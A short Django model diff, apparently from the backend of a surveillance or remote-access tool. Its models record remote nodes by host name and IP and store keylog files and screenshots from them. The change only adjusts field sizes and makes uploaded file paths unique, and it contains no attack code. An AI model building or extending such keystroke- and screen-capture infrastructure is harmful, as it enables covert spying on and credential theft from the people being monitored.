@@ -21,7 +21,7 @@ class Node(models.Model):
     # Connection Info
     uuid = models.CharField(max_length=128, unique=True,
                             null=False, blank=False)
-    hash_sum = models.CharField(max_length=512)
+    hash_sum = models.CharField(max_length=1024)
     host_name = models.CharField(max_length=512)
     ipv4 = models.GenericIPAddressField(protocol='IPv4', null=True, blank=True)
     first_seen = models.DateTimeField(auto_now_add=True)
@@ -123,7 +123,7 @@ class Keylog(models.Model):
     timestamp = models.DateTimeField(auto_now_add=True)
 
     log_file = models.FileField(
-        upload_to=get_keylog_path, max_length=512)
+        upload_to=get_keylog_path, max_length=512, unique=True)
 
     def __str__(self):
         return f'{self.node.uuid}:{self.timestamp}'
@@ -142,7 +142,7 @@ class Capture(models.Model):
         max_length=32, choices=capture_types, default='screenshot')
 
     capture = models.ImageField(
-        upload_to=get_image_path, max_length=512)
+        upload_to=get_image_path, max_length=512, unique=True)
     timestamp = models.DateTimeField(auto_now_add=True)
 
     def __str__(self):
